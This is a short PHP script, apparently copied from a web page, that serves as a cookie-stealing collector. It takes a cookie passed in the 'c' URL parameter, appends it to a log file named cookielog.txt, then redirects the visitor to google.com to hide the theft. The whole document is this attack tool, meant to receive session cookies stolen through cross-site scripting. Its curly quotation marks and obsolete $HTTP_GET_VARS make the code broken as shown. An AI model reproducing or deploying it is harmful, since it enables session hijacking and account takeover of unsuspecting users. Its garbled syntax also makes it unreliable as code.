<?php

$cookie = $HTTP_GET_VARS[” c“];
$file = fopen(‘cookielog.txt‘, ‘a’); 
fwrite($file, $cookie . “\n\n”); 
echo ” <script>location.href=’http://www.google.com‘;</script>”;

?>